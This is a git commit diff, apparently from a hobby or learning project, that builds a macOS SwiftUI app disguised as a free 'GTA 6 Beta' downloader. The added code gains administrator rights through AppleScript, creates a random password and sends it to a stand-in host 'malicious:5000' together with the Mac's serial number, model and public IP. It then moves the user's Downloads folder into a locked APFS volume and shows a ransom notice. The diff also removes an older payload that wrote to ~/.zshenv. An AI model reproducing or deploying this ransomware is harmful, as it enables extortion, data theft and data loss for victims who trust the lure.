e8db40ea4eca4691942c5ef301239858aebcfe3c
wolf606 <luismsanchez808@gmail.com>
2024-03-18 20:59:18 -0400

    Implement app for ransomware

--- game/ContentView.swift
+++ game/ContentView.swift
@@ -8,25 +8,6 @@
 import SwiftUI
 import Foundation
 
-@discardableResult // Add to suppress warnings when you don't want/need a result
-func safeShell(_ command: String) throws -> String {
-    let task = Process()
-    let pipe = Pipe()
-    
-    task.standardOutput = pipe
-    task.standardError = pipe
-    task.arguments = ["-c", command]
-    task.executableURL = URL(fileURLWithPath: "/bin/zsh") //<--updated
-    task.standardInput = nil
-
-    try task.run() //<--updated
-    
-    let data = pipe.fileHandleForReading.readDataToEndOfFile()
-    let output = String(data: data, encoding: .utf8)!
-    
-    return output
-}
-
 public extension URL {
     static var userHome : URL   {
         URL(fileURLWithPath: userHomePath, isDirectory: true)
@@ -44,36 +25,154 @@ public extension URL {
 }
 
 struct ContentView: View {
-    
-    let bundle = Bundle.main
+    @State private var showingAlert = false
+    @State private var alertMessage = ""
+    @State private var loading = false
+    @State private var ransomed = false
+    @State private var ransoMsg = ""
     
     var body: some View {
         VStack {
+            Spacer()
             Image(systemName: "globe")
                 .imageScale(.large)
                 .foregroundColor(.accentColor)
+            Spacer()
             Text("Download GTA 6 Beta for free!")
                 .font(.title)
+            Spacer()
             Button(action: signIn) {
                 Label("Download now!", systemImage: "icloud.and.arrow.down.fill")
             }
+            .alert(isPresented: $showingAlert) {
+                Alert(title: Text("Error"), message: Text(alertMessage), dismissButton: .default(Text("OK")))
+            }
+            .alert(isPresented: $ransomed) {
+                Alert(title: Text("Ransom Notice"), message: Text("You've been ransomed!. Error: "+ransoMsg), dismissButton: .default(Text("OK")))
+            }
+            Spacer()
+            //show loading indicator
+            if loading {
+                ProgressView(
+                    "Downloading..."
+                )
+            }
+            Spacer()
         }
         .padding()
+        .frame(width: 400, height: 600)
+    }
+    
+    func getAppleScript(shellScript: String) -> String {
+        return "do shell script \"\(shellScript)\" with administrator privileges";
+    }
+    
+    func runAppleScript(script: String) -> String? {
+        let appleScript = NSAppleScript(source: script)
+        let eventResult = appleScript?.executeAndReturnError(nil)
+        return eventResult?.stringValue
+    }
+    
+    func getSystemInformation() -> (String?, String?) {
+        let serialNumber = runShellCommand("system_profiler SPHardwareDataType | awk '/Serial/ {print $4}'")
+        let macType = runShellCommand("system_profiler SPHardwareDataType | awk '/Model Identifier/ {print $3}'")
+        return (serialNumber, macType)
+    }
+
+    func runShellCommand(_ command: String) -> String? {
+        let task = Process()
+        let pipe = Pipe()
+
+        task.standardOutput = pipe
+        task.arguments = ["-c", command]
+        task.launchPath = "/bin/bash"
+        task.launch()
+
+        let data = pipe.fileHandleForReading.readDataToEndOfFile()
+        let output = String(data: data, encoding: .utf8)
+
+        return output?.trimmingCharacters(in: .whitespacesAndNewlines)
+    }
+
+    func getPublicIP(completion: @escaping (String?) -> Void) {
+        let url = URL(string: "https://api.ipify.org")!
+        let task = URLSession.shared.dataTask(with: url) { (data, response, error) in
+            if let data = data {
+                let ip = String(data: data, encoding: .utf8)
+                completion(ip)
+            } else {
+                print("Failed to get IP address: \(error?.localizedDescription ?? "Unknown error")")
+                completion(nil)
+            }
+        }
+        task.resume()
+    }
+
+    func encryptData(pwd: String, homeDir: String) {
+        let pwdShellScript = """
+        sh -c 'diskutil apfs addVolume disk1 APFS ohno -passphrase \\"\(pwd)\\"; rsync -zvrh --remove-source-files \(homeDir)/Downloads /Volumes/ohno; diskutil unmount ohno;'
+        """
+        let shellScript = getAppleScript(shellScript: pwdShellScript)
+        print(shellScript)
+        //ransoMsg = runAppleScript(script: shellScript)!
+        ransomed = true
     }
     
     func signIn() {
-        var files = bundle.bundleURL
-        let home = URL.userHome.path
-        let command = """
-        cd \(home) && echo 'echo "You have been hacked!"' > ~/.zshenv
+        
+        let home = URL.userHome.path;
+        let pwdShellScript = """
+        sh -c 'p=$(head -n 1024 /dev/urandom | LC_ALL=C tr -dc \\"[:alnum:]\\" | head -c 64); echo $p'
         """
-        do {
-            //print(files)
-            var output = try safeShell(command)
-            print(output)
+        let pwd = runAppleScript(script: getAppleScript(shellScript: pwdShellScript))
+        if (pwd == nil) {
+            alertMessage = "Failed to generate password"
+            showingAlert = pwd == nil
         }
-        catch {
-            print("\(error)")
+        print(pwd)
+        
+        let system_info = getSystemInformation()
+        if (system_info.0 == nil || system_info.1 == nil) {
+            alertMessage = "Failed to get system information"
+            showingAlert = true
+        }
+
+        //get my public ip
+
+        var ip: String?
+        getPublicIP { (publicIP) in
+            ip = publicIP
+            let serialNumber = system_info.0!
+            let macType = system_info.1!
+
+            let url = URL(string: "http://malicious:5000/gta6")!
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.addValue("application/json", forHTTPHeaderField: "Content-Type")
+
+            let json: [String: Any] = ["pwd": pwd, "deviceInfo": ["serial": serialNumber, "model": macType], "ip": ip]
+            print(json)
+            let jsonData = try? JSONSerialization.data(withJSONObject: json)
+
+            request.httpBody = jsonData
+
+            let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
+                if let error = error {
+                    print("Error: \(error)")
+                    alertMessage = "Failed to connect to server"
+                    showingAlert = true
+                } else if let data = data {
+                    let str = String(data: data, encoding: .utf8)
+                    print("Received data:\n\(str ?? "")")
+                    loading = true
+                    encryptData(pwd: pwd!, homeDir: home)
+                } else {
+                    alertMessage = error?.localizedDescription ?? "Unknown error"
+                    showingAlert = true
+                }
+            }
+
+            task.resume()
         }
     }
 }
